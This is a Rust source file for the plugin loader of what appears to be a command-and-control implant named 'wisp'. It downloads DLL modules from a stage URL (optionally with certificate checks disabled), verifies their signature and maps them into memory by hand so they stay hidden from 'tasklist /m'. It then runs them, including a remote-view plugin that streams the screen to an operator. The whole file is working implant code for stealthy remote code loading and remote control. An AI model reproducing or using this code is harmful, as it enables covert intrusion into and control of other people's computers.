// Native plugin host (plan P5): signed cdylib plugins are fetched (task payload
// or one-time Type4 stage URL), Ed25519-verified against the baked-in
// plugin_pubkey and manually mapped with wisp_map — the DLL never touches the
// loader's module lists, so it stays out of `tasklist /m`.
//
// ABI v1 (versioned struct; only append fields on a bump):
//   u32 wisp_plugin_abi();
//   i32 wisp_plugin_init(const WispHostApiV1*);
//   i32 wisp_plugin_start();   // optional
//   i32 wisp_plugin_stop();    // optional
// WispHostApiV1 { abi: u32, log: fn(level, cstr) }.
use std::ffi::{c_char, CStr};
use std::os::raw::c_void;
use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
use std::sync::mpsc::{self, Receiver, Sender};
use std::sync::{Arc, OnceLock};
use std::time::Duration;

use base64::Engine;
use ed25519_dalek::{Signature, Verifier, VerifyingKey};
use serde::Deserialize;
use serde_json::Value;
use sha2::{Digest, Sha256};

use crate::rcp::{self, Chans};
use crate::Agent;

pub const WISP_PLUGIN_ABI_V1: u32 = 1;

// Append-only since v1: view_frame was added for feature plugins (rdp); old
// plugins compiled against the two-field struct keep working.
#[repr(C)]
pub struct WispHostApiV1 {
    pub abi: u32,
    pub log: Option<extern "C" fn(u32, *const c_char)>,
    pub view_frame: Option<extern "C" fn(*mut c_void, *const u8, usize) -> i32>,
}

extern "C" fn host_log(level: u32, msg: *const c_char) {
    if msg.is_null() {
        return;
    }
    let s = unsafe { CStr::from_ptr(msg) };
    eprintln!("plugin[L{level}] {}", s.to_string_lossy());
}

static HOST: OnceLock<WispHostApiV1> = OnceLock::new();

// One view session: the plugin pushes frames through the host callback, which
// forwards them on the RCP channel whose id/seq it captured here.
struct ViewSink {
    tx: Sender<rcp::Frame>,
    seq: Arc<AtomicU32>,
    chan: u32,
}

extern "C" fn view_frame_cb(user: *mut c_void, data: *const u8, len: usize) -> i32 {
    if user.is_null() || data.is_null() || len == 0 {
        return 0;
    }
    let sink = unsafe { &*(user as *const ViewSink) };
    let bytes = unsafe { std::slice::from_raw_parts(data, len) }.to_vec();
    if rcp::send_frame(&sink.tx, &sink.seq, sink.chan, bytes) {
        1
    } else {
        0
    }
}

#[derive(Clone, Copy)]
struct ViewFns {
    start: unsafe extern "C" fn(*mut c_void) -> i32,
    input: unsafe extern "C" fn(*mut c_void, *const u8, usize) -> i32,
    stop: unsafe extern "C" fn(*mut c_void) -> i32,
}

static VIEW: OnceLock<ViewFns> = OnceLock::new();

pub fn has_view() -> bool {
    VIEW.get().is_some()
}

// try_run_view serves one view channel through the loaded plugin. It is only
// called when has_view() is true; on capture/plugin failure the built-in loop
// remains available to the operator via the placeholder path.
pub(crate) fn try_run_view(
    chan: u32,
    tx: Sender<rcp::Frame>,
    seq: Arc<AtomicU32>,
    rx: Receiver<rcp::Delivery>,
    stop: Arc<AtomicBool>,
    chans: Chans,
) {
    let Some(view) = VIEW.get() else {
        return;
    };
    let sink = Box::new(ViewSink { tx, seq, chan });
    let user = Box::into_raw(sink) as *mut c_void;
    if unsafe { (view.start)(user) } != 0 {
        eprintln!("plugin: view_start failed, falling back to built-in capture");
        unsafe { drop(Box::from_raw(user as *mut ViewSink)) };
        return;
    }
    loop {
        if stop.load(Ordering::SeqCst) {
            break;
        }
        match rx.recv_timeout(Duration::from_secs(1)) {
            Ok(d) => {
                if !d.ctrl {
                    unsafe { (view.input)(user, d.data.as_ptr(), d.data.len()) };
                }
            }
            Err(mpsc::RecvTimeoutError::Timeout) => {}
            Err(mpsc::RecvTimeoutError::Disconnected) => break,
        }
    }
    unsafe { (view.stop)(user) };
    unsafe { drop(Box::from_raw(user as *mut ViewSink)) };
    rcp::drop_chan(&chans, chan);
}

#[derive(Deserialize)]
struct PluginLoadArgs {
    id: String,
    #[serde(default)]
    kind: String,
    manifest: String,
    #[serde(default, rename = "module")]
    module_b64: String,
    #[serde(default, rename = "stage_url")]
    stage_url: String,
    #[serde(default)]
    sha256: String,
    sig: String,
}

#[derive(Deserialize)]
struct ManifestLite {
    #[serde(default)]
    capabilities: Vec<String>,
    #[serde(default)]
    version: String,
}

pub(crate) fn load(a: &mut Agent, args: &Value) -> Result<String, String> {
    let args: PluginLoadArgs =
        serde_json::from_value(args.clone()).map_err(|e| format!("args: {e}"))?;
    if args.kind != "native-dll" {
        return Err(format!(
            "native host only loads native-dll modules (got {:?})",
            args.kind
        ));
    }
    let id = args.id.clone();
    let module = fetch_module(a, &args)?;
    if !args.sha256.is_empty() {
        let sum = hex::encode(Sha256::digest(&module));
        if !sum.eq_ignore_ascii_case(&args.sha256) {
            return Err(format!("sha256 mismatch: {sum}"));
        }
    }
    verify_signature(a, &args.manifest, &module, &args.sig)?;
    if args.stage_url.is_empty() {
        // base64 delivery is allowed but discouraged for native modules
        eprintln!("agent: plugin {id} delivered inline ({} bytes)", module.len());
    }
    let img = wisp_map::map_image(&module)?;
    wisp_map::call_entry(&img);

    let abi_ptr = wisp_map::resolve_export(&img, "wisp_plugin_abi")?;
    let abi_fn: unsafe extern "C" fn() -> u32 = unsafe { std::mem::transmute(abi_ptr) };
    let abi = unsafe { abi_fn() };
    if abi != WISP_PLUGIN_ABI_V1 {
        return Err(format!("plugin {id}: unsupported abi {abi}"));
    }
    let host = HOST.get_or_init(|| WispHostApiV1 {
        abi: WISP_PLUGIN_ABI_V1,
        log: Some(host_log),
        view_frame: Some(view_frame_cb),
    });
    let init_ptr = wisp_map::resolve_export(&img, "wisp_plugin_init")?;
    let init_fn: unsafe extern "C" fn(*const WispHostApiV1) -> i32 =
        unsafe { std::mem::transmute(init_ptr) };
    let rc = unsafe { init_fn(host) };
    if rc != 0 {
        return Err(format!("plugin {id}: init failed rc={rc}"));
    }
    if let Ok(start_ptr) = wisp_map::resolve_export(&img, "wisp_plugin_start") {
        let start_fn: unsafe extern "C" fn() -> i32 = unsafe { std::mem::transmute(start_ptr) };
        let rc = unsafe { start_fn() };
        if rc != 0 {
            return Err(format!("plugin {id}: start failed rc={rc}"));
        }
    }
    // feature plugins (rdp-windows): optional view triad
    if let (Ok(s), Ok(i), Ok(p)) = (
        wisp_map::resolve_export(&img, "wisp_plugin_view_start"),
        wisp_map::resolve_export(&img, "wisp_plugin_view_input"),
        wisp_map::resolve_export(&img, "wisp_plugin_view_stop"),
    ) {
        let fns = ViewFns {
            start: unsafe { std::mem::transmute(s) },
            input: unsafe { std::mem::transmute(i) },
            stop: unsafe { std::mem::transmute(p) },
        };
        if VIEW.set(fns).is_err() {
            eprintln!("plugin {id}: view handler already registered; ignoring");
        }
    }
    // plugins live for the process lifetime; never free the mapped image.
    std::mem::forget(img);
    let mut man = ManifestLite {
        capabilities: Vec::new(),
        version: String::new(),
    };
    let _ = serde_json::from_str::<ManifestLite>(&args.manifest).map(|m| man = m);
    a.mark_cap("plugin-native");
    for c in &man.capabilities {
        a.mark_cap(c);
    }
    Ok(format!(
        "loaded {}@{} abi={} caps={:?}",
        id, man.version, abi, man.capabilities
    ))
}

fn fetch_module(a: &Agent, args: &PluginLoadArgs) -> Result<Vec<u8>, String> {
    if !args.stage_url.is_empty() {
        let mut builder = ureq::AgentBuilder::new().timeout(std::time::Duration::from_secs(60));
        if a.cfg.insecure {
            builder = builder.tls_connector(std::sync::Arc::new(
                native_tls::TlsConnector::builder()
                    .danger_accept_invalid_certs(true)
                    .danger_accept_invalid_hostnames(true)
                    .build()
                    .map_err(|e| format!("tls: {e}"))?,
            ));
        }
        let agent = builder.build();
        let resp = agent
            .get(&args.stage_url)
            .call()
            .map_err(|e| format!("stage fetch: {e}"))?;
        let b64 = resp
            .into_string()
            .map_err(|e| format!("stage read: {e}"))?;
        base64::engine::general_purpose::STANDARD
            .decode(b64.trim())
            .map_err(|e| format!("stage b64: {e}"))
    } else {
        base64::engine::general_purpose::STANDARD
            .decode(&args.module_b64)
            .map_err(|e| format!("module b64: {e}"))
    }
}

fn verify_signature(a: &Agent, manifest: &str, module: &[u8], sig: &str) -> Result<(), String> {
    let pk_hex = a.cfg.plugin_pubkey.trim();
    if pk_hex.is_empty() {
        return Err("no plugin_pubkey in config — dynamic plugins disabled".into());
    }
    let pk = hex::decode(pk_hex).map_err(|e| format!("pubkey: {e}"))?;
    let pk: [u8; 32] = pk
        .try_into()
        .map_err(|_| "pubkey length".to_string())?;
    let vk = VerifyingKey::from_bytes(&pk).map_err(|e| format!("pubkey: {e}"))?;
    let sig_bytes = decode_sig(sig)?;
    let signature = Signature::from_slice(&sig_bytes).map_err(|e| format!("sig: {e}"))?;
    let mut msg = Vec::with_capacity(manifest.len() + module.len());
    msg.extend_from_slice(manifest.as_bytes());
    msg.extend_from_slice(module);
    if vk.verify(&msg, &signature).is_err() {
        return Err("SIGNATURE VERIFY FAILED — refusing to load".into());
    }
    Ok(())
}

fn decode_sig(sig: &str) -> Result<Vec<u8>, String> {
    if let Ok(b) = hex::decode(sig.trim()) {
        return Ok(b);
    }
    base64::engine::general_purpose::STANDARD
        .decode(sig.trim())
        .map_err(|e| format!("sig encoding: {e}"))
}